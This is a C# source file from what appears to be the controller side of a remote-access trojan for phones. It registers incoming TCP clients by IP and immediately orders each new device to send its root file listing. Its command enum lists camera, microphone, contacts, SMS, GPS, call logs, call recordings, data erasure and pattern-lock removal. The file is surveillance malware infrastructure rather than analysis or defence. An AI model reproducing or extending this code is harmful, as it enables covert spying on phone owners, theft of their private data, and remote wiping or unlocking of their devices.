using Remo.Features;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Remo.Connections
{

    static class DataHandler
    {
        public static void distribute(int dataType, int Flag, byte[] data, TcpClient c)
        {
            //   try {
            //    c.LastChecked = DateTime.Now;
            if (dataType == (int)eDataType.INIT_CONNECTION)
            {
                int Feature_type;
                Console.WriteLine(Encoding.UTF8.GetString(data));
                //  Int32.TryParse(Encoding.UTF8.GetString(data).Split(',')[0], out Connection_type);
                Int32.TryParse(Encoding.UTF8.GetString(data), out Feature_type);
                if (Flag == (int)eConnectionType.Main)
                {

                    IConnection conn = new Connection();
                    conn = new Connection();
                    conn.tcpClient = c;
                    conn.IP = (c.Client.RemoteEndPoint as IPEndPoint).Address.ToString();
                    conn.Port = (c.Client.RemoteEndPoint as IPEndPoint).Port.ToString();
                    conn.isMainConnection = true;
                    conn.LastChecked = DateTime.Now;
                    try
                    {
                        MainForm.mTCPH.MainConnectionsDict.Remove(conn.IP);
                    }
                    catch { }
                    MainForm.mTCPH.MainConnectionsDict.Add(conn.IP, conn);

                    MainForm.mTCPH.send(((int)DataHandler.eDataType.FM_DOWN).ToString(),
                    ((int)DataHandler.eOrderType.START).ToString(), "/",
                    conn.tcpClient);

                }
                else if (Flag == (int)eConnectionType.Feature)
                {
                    //IConnection fc = MainForm.mTCPH.getMainConnectionByIP(((c.Client.RemoteEndPoint as IPEndPoint).Address.ToString()));
                    //// fc = c;
                    //MainForm.mTCPH.FeatureConnectionsMapDict.Remove(
                    //    c.c.RemoteEndPoint.ToString());

                    //MainForm.mTCPH.FeatureConnectionsMapDict.Add(
                    //    c.Client.RemoteEndPoint.ToString(),
                    //    MainForm.mTCPH.getcByIP(
                    //        (c.c.RemoteEndPoint as IPEndPoint).Address.ToString()));




                    IConnection conn = new Connection();
                    conn = new Connection();
                    conn.tcpClient = c;
                    conn.IP = (c.Client.RemoteEndPoint as IPEndPoint).Address.ToString();
                    conn.Port = (c.Client.RemoteEndPoint as IPEndPoint).Port.ToString();
                    conn.isMainConnection = false;
                    //        MainForm.mTCPH.getMainConnectionByIP(conn.IP).Features[Feature_type].MainConnection = MainForm.mTCPH.getMainConnectionByIP(conn.IP);
                    //try
                    //{
                    //    MainForm.mTCPH.getMainConnectionByIP(conn.IP).Features.Remove(dataType);
                    //}
                    //catch { }
                    //MainForm.mTCPH.getMainConnectionByIP(conn.IP).Features.Add(dataType, conn);



                }
            }

            else
            {
                //try
                //{
                IConnection conn = new Connection();
                conn = new Connection();
                conn.tcpClient = c;
                conn.IP = (c.Client.RemoteEndPoint as IPEndPoint).Address.ToString();
                conn.Port = (c.Client.RemoteEndPoint as IPEndPoint).Port.ToString();
                conn.isMainConnection = false;
                MainForm.mTCPH.getMainConnectionByIP(conn.IP).Features[dataType].onDataReceived(Flag, data);
                //}
                //catch (Exception ex)
                //{
                //    Console.WriteLine("No Feature Found Exception " + ex.Message);
                //    Console.WriteLine("DataType " + dataType);
                //    Console.WriteLine("Time Since Run : " + (DateTime.Now - MainForm.mTCPH.DateStarted));
                //    throw new Exception();
                //}
            }
            //   }catch(Exception ex)
            //  {
            //       Console.WriteLine("Distribute Exeption: " + ex.Message);
            //      throw new Exception();
            //    }


        }
        public enum eConnectionType
        {
            Main,
            Feature
        }

        public enum eOrderType
        {
            START,
            STOP,
            UPDATE,
            ONE_SHOT
        }
        public enum eDataType
        {
            INIT_CONNECTION,
            INFO,
            CAM,
            MIC,
            FM_LIST,
            FM_DOWN,
            CONTACTS,
            SMS,
            GPS,
            CALL_LOG,
            CALL_RECORDS,
            ERASE_DATA,
            REMOVE_PATTERN_LOCK,
            MAKE_NOISE,
            ERROR
        }
    }
}
